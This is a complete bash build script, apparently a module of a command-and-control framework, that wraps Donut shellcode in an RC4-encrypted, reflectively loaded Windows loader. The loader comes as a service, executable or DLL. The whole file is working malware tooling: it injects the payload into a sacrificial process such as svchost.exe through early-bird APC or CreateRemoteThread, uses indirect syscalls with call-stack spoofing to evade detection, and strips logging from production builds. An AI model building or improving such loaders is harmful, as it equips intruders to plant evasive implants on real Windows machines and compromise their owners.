#!/usr/bin/env bash
# Build a self-unpacking Windows loader from a Donut sRDI shellcode blob.
#
# Runs on the C2 as a local module ("staged_loader"). Requires:
#   * a MinGW-w64 cross compiler matching --arch
#     (Linux: apt install gcc-mingw-w64-x86-64 / gcc-mingw-w64-i686,
#      Windows/msys2: mingw-w64-x86_64-gcc / mingw-w64-i686-gcc)
#   * a native C compiler (cc/gcc/clang) for the small RC4 pack helper
#   * nasm when --smw on (the default) on x64
#
# The build always produces the same two layers: a real loader DLL that is
# RC4-encrypted and embedded in the host, and the host itself. --format picks
# the host container:
#
#   service  one-shot Windows service executable (default)
#   exe      plain console executable (no service code)
#   dll      DLL exporting Run() for in-memory or normal loading
#
# The packed artifacts are embedded with .incbin (stage_data.S), not RCDATA,
# so the DLL form works when mapped in memory. Shared payload sources (rc4,
# ntsys, smw) come from ../common/ (mirrored into the operator workspace next
# to this module, like bof_common).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ---- parameters (defaults mirror config.json) ----
SHELLCODE=""
OUTPUT=""
PROCESS="svchost.exe"
PROCESS_ARGS=""
ARCH="x64"
KEY=""
INJECT="apc"
FORMAT="service"
SMW="on"
VERIFY_MS="5000"
DEBUG_FLAG=""

print_usage() {
  cat <<'EOF'
usage: build.sh --shellcode <agent.bin> [options]

options:
  --shellcode <path>   Donut sRDI shellcode .bin to embed (required)
  --output <path>      output file (default: <shellcode dir>/<name>_svc.exe
                       for service, <name>.exe for exe, <name>.dll for dll)
  --format <service|exe|dll>
                       host container to build (default: service)
                         service = one-shot Windows service executable
                         exe     = plain console executable
                         dll     = DLL exporting Run()
  --process <name>     sacrificial process: bare name (System32) or full path
                       (default: svchost.exe, e.g. dllhost.exe)
  --process-args <s>   optional args for the sacrificial process
  --arch <x64|x86>     architecture of blob and loader (default: x64)
  --key <hex>          RC4 key for the shellcode blob as hex; random 16-byte
                       key when omitted
  --inject <apc|ct>    load method: apc = early-bird QueueUserAPC (default),
                       ct = classic CreateRemoteThread (needs a sacrificial
                       that stays alive)
  --smw <on|off>       SilentMoonwalk call-stack spoofing for the loader's
                       indirect syscalls (x64 only; default: on)
  --verify-ms <n>      milliseconds to watch the spawned process after
                       injection before declaring success (default: 5000)
  --debug              keep verbose diagnostics in the binaries (default: no;
                       production builds compile all logging out)
EOF
}

# resolve to an absolute path without requiring the target to exist
abspath() {
  local p="$1"
  case "$p" in
  /* | [A-Za-z]:* | //*)
    printf '%s' "$p"
    ;;
  *)
    local d b resolved
    d="$(dirname "$p")"
    b="$(basename "$p")"
    if resolved="$(cd "$d" 2>/dev/null && pwd)"; then
      printf '%s/%s' "$resolved" "$b"
    else
      printf '%s/%s' "$(pwd)" "$p"
    fi
    ;;
  esac
}

needs_value() {
  case "$1" in
  --shellcode | --output | --process | --process-args | --process_args | --arch | --key | --inject | --format | --smw | --verify-ms | --verify_ms)
    return 0
    ;;
  esac
  return 1
}

set_opt() {
  local key="$1" val="$2"
  case "$key" in
  --shellcode) SHELLCODE="$val" ;;
  --output) OUTPUT="$val" ;;
  --process) PROCESS="$val" ;;
  --process-args | --process_args) PROCESS_ARGS="$val" ;;
  --arch) ARCH="$val" ;;
  --key) KEY="$val" ;;
  --inject) INJECT="$val" ;;
  --format) FORMAT="$val" ;;
  --smw)
    case "$val" in
    on | true | 1 | yes | "") SMW="on" ;;
    off | false | 0 | no) SMW="off" ;;
    *) SMW="$val" ;;
    esac
    ;;
  --verify-ms | --verify_ms) VERIFY_MS="$val" ;;
  --debug)
    case "$val" in
    true | 1 | yes) DEBUG_FLAG="1" ;;
    false | 0 | no | "") DEBUG_FLAG="" ;;
    *) DEBUG_FLAG="1" ;;
    esac
    ;;
  esac
}

# ---- parse args (order independent, tolerant of unknown flags such as the
# ---- universal --token/--user/--ticket injected by the C2 console)
while [[ $# -gt 0 ]]; do
  case "$1" in
  --help | -h)
    print_usage
    exit 0
    ;;
  --debug)
    # boolean-ish flag; may be followed by an explicit value from the C2
    # console (--debug false/true) or appear bare
    if [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
      case "$2" in
      true | 1 | yes) DEBUG_FLAG="1" ;;
      false | 0 | no | "") DEBUG_FLAG="" ;;
      *) DEBUG_FLAG="1" ;;
      esac
      shift 1
    else
      DEBUG_FLAG="1"
    fi
    shift 1
    ;;
  --*=*)
    set_opt "${1%%=*}" "${1#*=}"
    shift 1
    ;;
  --*)
    if needs_value "$1" && [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
      set_opt "$1" "$2"
      shift 2
    else
      set_opt "$1" ""
      shift 1
    fi
    ;;
  *)
    shift 1
    ;;
  esac
done

# ---- toolchain selection ----
case "$ARCH" in
x64 | amd64)
  CC="x86_64-w64-mingw32-gcc"
  ARCH_SMW_OK=1
  NASM_FORMAT="win64"
  ;;
x86 | 386)
  CC="i686-w64-mingw32-gcc"
  ARCH_SMW_OK=0
  NASM_FORMAT=""
  ;;
*)
  echo "[-] unsupported arch: $ARCH (use x64 or x86)" >&2
  exit 1
  ;;
esac

SMW_FLAG=""
[[ "$SMW" == on && "$ARCH_SMW_OK" == 1 ]] && SMW_FLAG="-DNTSYS_SMW"

HOSTCC=""
for c in cc gcc clang; do
  if command -v "$c" >/dev/null 2>&1; then
    HOSTCC="$c"
    break
  fi
done

# ---- validate ----
if [[ -z "$SHELLCODE" ]]; then
  echo "[-] --shellcode is required" >&2
  print_usage
  exit 1
fi
if [[ ! -f "$SHELLCODE" ]]; then
  echo "[-] shellcode file not found: $SHELLCODE" >&2
  exit 1
fi
if [[ -z "$HOSTCC" ]]; then
  echo "[-] no host C compiler found (need cc/gcc/clang for the RC4 pack helper)" >&2
  exit 1
fi
if ! command -v "$CC" >/dev/null 2>&1; then
  echo "[-] missing cross compiler: $CC" >&2
  echo "    Linux:  apt install gcc-mingw-w64-$( [[ "$ARCH" == x64 ]] && echo x86-64 || echo i686 )" >&2
  echo "    msys2:  pacman -S mingw-w64-$( [[ "$ARCH" == x64 ]] && echo x86_64 || echo i686 )-gcc" >&2
  exit 1
fi
if [[ -n "$SMW_FLAG" ]] && ! command -v nasm >/dev/null 2>&1; then
  echo "[-] missing nasm (required when --smw on; use --smw off to disable)" >&2
  exit 1
fi
case "$FORMAT" in
service | exe | dll) ;;
*)
  echo "[-] unsupported --format: $FORMAT (use service, exe or dll)" >&2
  exit 1
  ;;
esac
if [[ "$SMW" != on && "$SMW" != off ]]; then
  echo "[-] unsupported --smw: $SMW (use on or off)" >&2
  exit 1
fi
if [[ ! "$VERIFY_MS" =~ ^[0-9]+$ ]]; then
  echo "[-] --verify-ms must be a non-negative integer" >&2
  exit 1
fi

SHELLCODE_ABS="$(abspath "$SHELLCODE")"

# ---- default output name reflects the format ----
if [[ -z "$OUTPUT" ]]; then
  base="$(basename "$SHELLCODE_ABS")"
  case "$base" in
  *.bin) base="${base%.bin}" ;;
  *.*) base="${base%.*}" ;;
  esac
  case "$base" in
  *.exe) base="${base%.exe}" ;;
  esac
  case "$FORMAT" in
  service) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_svc.exe" ;;
  exe) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}.exe" ;;
  dll) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}.dll" ;;
  esac
fi
OUTPUT_ABS="$(abspath "$OUTPUT")"
mkdir -p "$(dirname "$OUTPUT_ABS")"

if [[ "$FORMAT" == service ]]; then
  STAGE_SERVICE_FLAG=""
else
  STAGE_SERVICE_FLAG="-DSTAGED_LOADER_NO_SERVICE"
fi

echo "[+] staged_loader build:"
if [[ -n "$SMW_FLAG" ]]; then
  SMW_DESC="enabled (x64)"
elif [[ "$ARCH_SMW_OK" == 1 ]]; then
  SMW_DESC="disabled"
else
  SMW_DESC="n/a (x86)"
fi
echo "    shellcode: $SHELLCODE_ABS ($(wc -c <"$SHELLCODE_ABS" | tr -d '[:space:]') bytes)"
echo "    arch:      $ARCH"
echo "    format:    $FORMAT"
echo "    process:   $PROCESS${PROCESS_ARGS:+ args: $PROCESS_ARGS}"
echo "    inject:    $INJECT"
echo "    key:       $([[ -n "$KEY" ]] && echo 'provided' || echo 'random (generated)')"
echo "    stage:     packed (RC4 stage DLL + shellcode blob)"
echo "    smw:       $SMW_DESC"
echo "    verify:    ${VERIFY_MS} ms"
echo "    output:    $OUTPUT_ABS"
echo "    logging:   $([[ -n "$DEBUG_FLAG" ]] && echo 'DEBUG (verbose, keep in binary)' || echo 'none (compiled out)')"

# ---- build in a scratch dir so no artifacts pollute the module tree ----
BUILDDIR="$(mktemp -d "${TMPDIR:-/tmp}/staged_loader.XXXXXX")"
trap 'rm -rf "$BUILDDIR"' EXIT

cp "$SCRIPT_DIR"/loader.c "$SCRIPT_DIR"/stager.c "$SCRIPT_DIR"/dllhost.c \
  "$SCRIPT_DIR"/bootstrap.c "$SCRIPT_DIR"/bootstrap.h \
  "$SCRIPT_DIR"/reflect.c "$SCRIPT_DIR"/reflect.h \
  "$SCRIPT_DIR"/stage_abi.h "$SCRIPT_DIR"/stage_data.h \
  "$SCRIPT_DIR"/pack.c "$SCRIPT_DIR"/config.h \
  "$SCRIPT_DIR"/../common/rc4.c "$SCRIPT_DIR"/../common/rc4.h \
  "$SCRIPT_DIR"/../common/ntsys.c "$SCRIPT_DIR"/../common/ntsys.h \
  "$BUILDDIR"/
if [[ -n "$SMW_FLAG" ]]; then
  mkdir -p "$BUILDDIR/smw"
  cp "$SCRIPT_DIR"/../common/smw/* "$BUILDDIR/smw/"
fi

# ---- bake build config into config.h (escape C wide strings) ----
esc_c() {
  printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
}
{
  printf '/* generated by build.sh */\n'
  printf '#ifndef STAGED_LOADER_CONFIG_H\n'
  printf '#define STAGED_LOADER_CONFIG_H\n'
  printf '#define SACRIFICIAL_PROCESS L"%s"\n' "$(esc_c "$PROCESS")"
  printf '#define SACRIFICIAL_ARGS L"%s"\n' "$(esc_c "$PROCESS_ARGS")"
  printf '#define INJECT_VERIFY_MS %s\n' "$VERIFY_MS"
  printf '#endif /* STAGED_LOADER_CONFIG_H */\n'
} >"$BUILDDIR/config.h"

# Native MinGW gcc needs a Windows temp path when invoked from MSYS/Cygwin;
# otherwise it falls back to C:\Windows and fails to create temporary files.
# TMPDIR stays a POSIX path for mktemp; TMP/TEMP are what gcc reads.
if command -v cygpath >/dev/null 2>&1; then
  TMP_WIN="$(cygpath -w "${TMPDIR:-${TMP:-/tmp}}")"
  export TMP="$TMP_WIN" TEMP="$TMP_WIN"
fi

cd "$BUILDDIR"

# ---- RC4-encrypt the blob + write key.bin (host-native helper) ----
# MinGW's gcc driver appends .exe to extension-less -o names, so pick the
# actual binary name instead of assuming ./pack.
PACK_OUT="pack"
"$HOSTCC" -O2 -Wall -o "$PACK_OUT" pack.c rc4.c
if [[ ! -x "$PACK_OUT" && -x "pack.exe" ]]; then
  PACK_OUT="pack.exe"
fi
if [[ -n "$KEY" ]]; then
  ./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin "$KEY"
else
  ./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin
fi

INJECT_FLAG=""
[[ "$INJECT" == ct ]] && INJECT_FLAG="-DCLASSIC_INJECT"

# ---- build the stage DLL (the real loader, mapped only in memory) ----
"$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} $INJECT_FLAG $STAGE_SERVICE_FLAG \
  -DUNICODE -D_UNICODE -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 $SMW_FLAG \
  -I. -c loader.c -o loader_stage.o
"$CC" -O2 -Wall -Wextra $SMW_FLAG -I. -c ntsys.c -o ntsys.o
"$CC" -O2 -Wall -Wextra -c rc4.c -o rc4.o
STAGE_OBJS="loader_stage.o rc4.o ntsys.o"
if [[ -n "$SMW_FLAG" ]]; then
  "$CC" -O2 -Wall -Wextra -I. -c smw/SilentMoonwalk.c -o smw/SilentMoonwalk.o
  nasm -f "$NASM_FORMAT" smw/DesyncSpoofer.asm -o smw/DesyncSpoofer.o
  STAGE_OBJS="$STAGE_OBJS smw/SilentMoonwalk.o smw/DesyncSpoofer.o"
fi
# --dynamicbase keeps the base relocation table; the reflective loader needs
# it to map the DLL away from its preferred base.
"$CC" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o stage.dll \
  $STAGE_OBJS -ladvapi32 -lshell32

if [[ ! -s stage.dll ]]; then
  echo "[-] stage DLL link produced an empty output" >&2
  exit 1
fi
if [[ "$(head -c 2 stage.dll | od -An -tx1 | tr -d ' \n')" != "4d5a" ]]; then
  echo "[-] stage DLL is not a PE" >&2
  exit 1
fi

# ---- RC4-encrypt the stage DLL (fresh random key per build) ----
./"$PACK_OUT" stage.dll stage.bin stage_key.bin

# ---- embed the packed artifacts as a data section (.incbin) ----
cat >stage_data.S <<'EOF'
.section .rdata,"dr"
.global staged_loader_stage_start
staged_loader_stage_start:
.incbin "stage.bin"
.global staged_loader_stage_end
staged_loader_stage_end:
.global staged_loader_stage_key_start
staged_loader_stage_key_start:
.incbin "stage_key.bin"
.global staged_loader_stage_key_end
staged_loader_stage_key_end:
.global staged_loader_payload_start
staged_loader_payload_start:
.incbin "payload.bin"
.global staged_loader_payload_end
staged_loader_payload_end:
.global staged_loader_key_start
staged_loader_key_start:
.incbin "key.bin"
.global staged_loader_key_end
staged_loader_key_end:
EOF
"$CC" -c stage_data.S -o stage_data.o

# ---- build the host container ----
"$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c bootstrap.c -o bootstrap.o
"$CC" -O2 -Wall -Wextra -c reflect.c -o reflect.o
"$CC" -O2 -Wall -Wextra -c rc4.c -o rc4_host.o

HOST_OBJS="bootstrap.o reflect.o rc4_host.o stage_data.o"
if [[ "$FORMAT" == dll ]]; then
  "$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c dllhost.c -o host.o
  # --dynamicbase lets the DLL relocate when mapped in memory.
  "$CC" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o loader_out.dll \
    host.o $HOST_OBJS -lshell32
  BUILT="loader_out.dll"
else
  "$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -DUNICODE -D_UNICODE \
    -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -c stager.c -o host.o
  "$CC" -O2 -s -o loader_out.exe host.o $HOST_OBJS -lshell32
  BUILT="loader_out.exe"
fi

# ---- sanity check the PE before copying it out ----
if [[ ! -s "$BUILT" ]]; then
  echo "[-] link produced an empty output" >&2
  exit 1
fi
magic="$(head -c 2 "$BUILT" | od -An -tx1 | tr -d ' \n')"
if [[ "$magic" != "4d5a" ]]; then
  echo "[-] output is not a PE ($magic)" >&2
  exit 1
fi

cp "$BUILT" "$OUTPUT_ABS"
SIZE="$(wc -c <"$OUTPUT_ABS" | tr -d '[:space:]')"
echo "[+] wrote $OUTPUT_ABS ($SIZE bytes)"
if command -v sha256sum >/dev/null 2>&1; then
  echo "    sha256: $(sha256sum "$OUTPUT_ABS" | awk '{print $1}')"
elif command -v shasum >/dev/null 2>&1; then
  echo "    sha256: $(shasum -a 256 "$OUTPUT_ABS" | awk '{print $1}')"
fi
